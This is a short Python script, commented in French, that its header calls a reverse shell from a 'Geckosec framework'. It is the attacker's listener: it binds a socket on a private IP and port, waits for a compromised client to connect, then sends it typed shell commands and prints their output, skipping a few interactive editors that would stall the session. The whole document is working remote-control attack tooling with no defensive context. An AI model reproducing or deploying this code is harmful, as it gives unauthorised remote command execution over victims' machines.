#!/usr/bin/python3

# A python Reverse-shell
# Developed by Elieroc
# Start of project : 25/11/2020
# Actual version : 1.1

import socket

def main():

    host, port = ('192.168.43.90', 1234)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    print('Le serveur est démarré !'+"\n")

    while True:
        sock.listen()
        conn, address = sock.accept()
        print("/!\ Client connecté /!\ \n")

        path = "\033[0;32m" + conn.recv(9999).decode("utf8") + '\033[1;36m$ \033[1;37m'

        while True:

            banned_command = ["nano", "vi", "vim", "clear"]
            banned = 0

            data=str( input(path) )

            for command in banned_command:
                if data == command:
                    print("Cette commande n'est pas utilisable")
                    # On envoie une informatique vide pour ne pas perdre la connexion
                    null = " "
                    null = null.encode("utf-8")
                    conn.send(null)
                    # On met l'état banned à 1 pour une vérification future
                    banned = 1

            if data[:2] == "cd":
                data = data.encode("utf8")
                conn.send(data)
                path = conn.recv(9999)
                path = "\033[0;32m" + str( path.decode("utf-8", errors="ignore")) + '$ '

            if data == "exit":
                print("Merci d'avoir utilisé Geckosec framework !")
                conn.close()
                sock.close()
                return 0

            else:
                if banned == 0:
                    try:
                        data = data.encode("utf8")
                    except:pass
                    conn.send(data)

                    data = conn.recv(9999)
                    data = str( data.decode("utf-8", errors="ignore"))
                    print("\n"+data)
                else:
                    continue

    conn.close()
    sock.close()

main()
